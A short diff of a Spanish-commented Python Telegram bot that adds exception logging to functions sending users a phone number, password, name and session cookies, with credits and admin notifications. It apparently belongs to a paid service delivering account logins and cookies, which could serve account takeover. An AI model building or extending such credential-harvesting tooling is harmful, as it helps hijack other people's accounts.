@@ -281,7 +281,7 @@ def get_confirm_keyboard(user_id: int) -> InlineKeyboardMarkup:
 # =============================================================================
 
 def send_success_message_sync(chat_id: int, phone: str, password: str, name: str, cookies: str, elapsed: float):
-    """Versión síncrona para usar desde hilos"""
+    """Versión síncrona para usar desde hilos - CORREGIDA"""
     safe_phone = html.escape(phone)
     safe_password = html.escape(password)
     safe_name = html.escape(name)
@@ -315,6 +315,8 @@ def send_success_message_sync(chat_id: int, phone: str, password: str, name: str
                 loop.run_until_complete(bot.send_message(chat_id, msg))
         else:
             loop.run_until_complete(bot.send_message(chat_id, f"🍪 <b>Cookies:</b>\n\n<code>{safe_cookies}</code>"))
+    except Exception as e:
+        logger.error(f"Error enviando mensaje de éxito: {e}")
     finally:
         loop.close()
 
@@ -333,6 +335,8 @@ def send_error_message_sync(chat_id: int, error_msg: str, credits_restored: int)
             f"Balance actual: <b>{credits_restored}</b>",
             reply_markup=get_main_keyboard()
         ))
+    except Exception as e:
+        logger.error(f"Error enviando mensaje de error: {e}")
     finally:
         loop.close()
 
@@ -353,6 +357,8 @@ def notify_admin_sync(admin_id: int, user, phone: str, name: str, cookie_count: 
             f"🍪 Cookies: {cookie_count}\n"
             f"⏱ Tiempo: {elapsed:.2f}s"
         ))
+    except Exception as e:
+        logger.error(f"Error notificando a admin: {e}")
     finally:
         loop.close()
 
